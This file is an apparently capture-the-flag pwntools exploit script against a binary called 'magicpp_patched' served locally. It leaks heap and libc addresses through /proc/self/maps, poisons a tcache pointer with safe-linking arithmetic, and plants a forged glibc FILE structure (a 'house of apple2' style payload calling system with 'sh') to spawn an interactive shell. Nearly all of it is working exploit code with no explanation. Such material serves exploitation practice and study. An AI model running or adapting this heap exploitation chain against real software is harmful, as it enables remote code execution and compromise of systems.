from pwn import *
from PwnAssistor.attacker import *
context.update(arch='amd64', os='linux')
# context.log_level = 'debug'
exe_path = ('./magicpp_patched')
exe = context.binary = ELF(exe_path)
pwnvar.pwnlibc = libc = ELF('./libc.so.6')

import docker
client = docker.from_env()
docker_id = "41d4f7e349bf"


def docker_gdb_attach():
    pid = client.containers.get(docker_id).top()["Processes"][-1][1]
    # print(client.containers.get(docker_id).top())
    gdb.attach(int(pid), exe="./magicpp_patched", gdbscript="") # does not work for some reason
    #with open("./gdbscript","w") as cmds:
    #    cmds.write(gdbscript)
    #dbg = process(context.terminal + ["gdb","-pid",f"{pid}","-x","./gdbscript"])
    pause()


host = '127.0.0.1'
port = 12000
if sys.argv[1] == 'r':
    p = remote(host, port)
elif sys.argv[1] == 'p':
    p = process(exe_path)  
else:
    p = gdb.debug(exe_path, 'decompiler connect ida --host localhost --port 3662')
    
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def gdb_pause(p, cmd=""):
    gdb.attach(p, gdbscript=cmd)  
    pause()

def insert(value, name, size, content):
    p.sendlineafter('choice:', '1')
    p.sendlineafter(':', str(value))
    p.sendlineafter(':',  name)
    p.sendlineafter(':', str(size))
    p.sendlineafter(':', content)

def load(file_name):
    p.sendlineafter('choice:', '4')
    p.sendlineafter(':', file_name)

def show(index):
    p.sendlineafter('choice:', '6')
    p.sendlineafter(':', str(index))

def free(index):
    p.sendlineafter('choice:', '2')
    p.sendlineafter(':', str(index))


def house_of_apple2(target_addr: int):
    jumps = libc.sym['_IO_wfile_jumps']
    system = libc.sym['system']
    wide_addr = target_addr
    vtable_addr = target_addr
    payload = b'    sh'.ljust(8, b'\x00')
    payload = payload.ljust(0x28, b'\x00')
    payload += p64(1)
    payload = payload.ljust(0x68, b'\x00')
    payload += p64(system)
    payload = payload.ljust(0xa0, b'\x00')
    payload += p64(wide_addr)
    payload = payload.ljust(0xd8, b'\x00')
    payload += p64(jumps)
    payload = payload.ljust(0xe0, b'\x00')
    payload += p64(vtable_addr)
    return payload

def pwn():
    p.sendlineafter('name:', 'aa')
    load('/proc/self/maps')
    # gdb_pause(p)
    # p.interactive()
    show(1)
    heap_base = 0

    for i in range(0x10):
        # print(i)
        # print(p.recvline())
        res = p.recvline()
        if b"heap" in res:
            heap_base = int(res.split(b"-")[0], 16)
            # break
        if b"libc.so.6" in res:
            libc.address = int(res.split(b"-")[0], 16)
            break

    log.success(f"libc address: {hex(libc.address)}")
    log.success(f"heap address: {hex(heap_base)}")
    # p.interactive()
    free(1)
    insert(0, str(ord("x")), 0x3c8-1, 'a')
    free(1)
    
    target = (libc.address + 0x21b680)^( (heap_base+0x11eb0)>>12)
    
    insert(target, str(ord("x")), 0x10, 'a')

    
    for i in range(0x18):
        insert(0, "a", 0x10, 'a')

    payload = cyclic(0x40)+io.house_of_lys(heap_base+0x11eb0+0x40)
    insert(0, "xxx", 0x3c8-1, payload)
    # 
    insert(0, 'res', 0x3c8-1, p64(heap_base+0x11eb0+0x40))
    
    # docker_gdb_attach()
    # gdb_pause(p)
    p.interactive()
    # 0x83b9b
pwn()